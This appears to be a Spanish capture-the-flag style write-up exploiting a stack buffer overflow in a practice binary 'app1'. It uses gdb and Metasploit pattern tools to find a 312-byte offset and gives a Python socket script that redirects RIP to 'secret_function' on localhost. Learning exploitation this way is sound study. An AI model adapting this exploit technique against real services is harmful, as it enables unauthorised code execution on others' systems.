# app1

Explotando el binario `app1`

si ejecutamos el binario `app1` observamos que se coloca en escucha por el puerto 17562, por lo que podemos conectarnos a el con `telnet`

![image](https://github.com/user-attachments/assets/ee5ab224-75a8-48e7-87e3-a627d2141179)

ocurrio un fallo de segmentacion, por lo que es posible sea vulnerable a un `BOF`, asi que examinamos el binario

### Examinando app1

```ruby
file app1

app1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3589d42a1b8b5e53fc45068bb9e596a1104b1b9a, for GNU/Linux 3.2.0, not stripped
```

binario de 64 bit, ahora chequeamos las protecciones que tenga

```ruby
checksec --file=app1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols	  No	0		1		app1
```
NX esta activo lo que nos indica que no podremos inyectar una shellcode en la memoria para su ejecucion, veremos en que lo derivamos

### Chequeamos las funciones presentes en el binario

para esto debemos correr el binario en un depuradora (gdb en mi caso)

```ruby
gdb ./app1 -q
```

ahora inspeccionamos las funciones 

```ruby
info functions
```

![image](https://github.com/user-attachments/assets/11ec4143-74de-4638-9b05-206246393469)

aqui puedo observar una funcion un tanto llamativa `secret_function`, por lo que intentare redirigir el flojo del programa a ella para que la ejecute, asi que comenzamos
calculando el offset

### Calculando el offset

hacemos uso de 2 exploit de `metasploit`

```bash
1) /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
2) /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

generamos con el primer exploir una cadena especial que enviaremos al binario

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500       
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

enviamos la cadena

![image](https://github.com/user-attachments/assets/b5aacd11-2dac-4cea-b57f-31bb50ab6ff0)

localizamos el valor de rip (lo que seria eip en x86)

![image](https://github.com/user-attachments/assets/0eb823ff-7036-4e25-98ab-3cf72d7d6b90)

si intentamos pasarle este valor al segundo exploit de metasploit no funcionara como funciona en el caso de los binarios `x86`, debemos localizarlo de la siguiente manera

```bash
info frame
```

![image](https://github.com/user-attachments/assets/79dcf01a-37ff-450a-a682-a38725057eb0)

el valor que necesitamos es `saved rip = 0x6b41356b41346b41`, se lo pasamos al 2so exploit de metasploit para calcular el valor `offset`

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6b41356b41346b41 
[*] Exact match at offset 312
```
obtenemos el valor offset `[312]`, lo comprobamos

![image](https://github.com/user-attachments/assets/a9637613-cfa4-4f15-b8ef-dd3f7d4aaba0)

estamos bajo control de `rip`, ahora localizamos la direccion de memoria de la funcion `secret_function`

![image](https://github.com/user-attachments/assets/b94accc1-fe6f-4d2c-b000-58d54feeda63)

direccion de memoria `0x00000000004011b6`

### apuntando a la funcion `secret_function` + construccion de script

para que el flujo del programa vaya a la funcion `secret_function` debemos escribir en `rip` la direccion de memoria de la funcion, asi que creamos un script

```python
#!/usr/bin/env python3

import socket
ip_addr = "127.0.0.1"
port = 17562
offset = 312
full_buffer = b"A"*offset #Desbordamos el buffer para alcanzar `rip`
rip = b"\xb6\x11\x40\x00" #Redireccionamos el flujo del programa a la funcion secret_function
payload = full_buffer + rip
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creamos un socket
sock.connect((ip_addr, port)) #  establecemos la conexion con el binario
sock.recv(1024) # recibimos datos {Escribe algo:}
sock.send(payload) # enviamos el payload
sock.close() # cerramos el socket
```
ahora ya tenemos el script, corremos el binario a traves del depurador y ejecutamos el script

![image](https://github.com/user-attachments/assets/fd9b6b23-49bc-4034-881c-47325791f0ae)

y vemos como el binario nos a devuelto una cadena

```bash
02e5e6ea15b5d3088af6edf49269a7221eb88dc32747420dc2e482110f649deb
```

asi logramas explotar el buffer overflow, esta vez redirigimos el programa a una funcion que nos a devuelto informacion
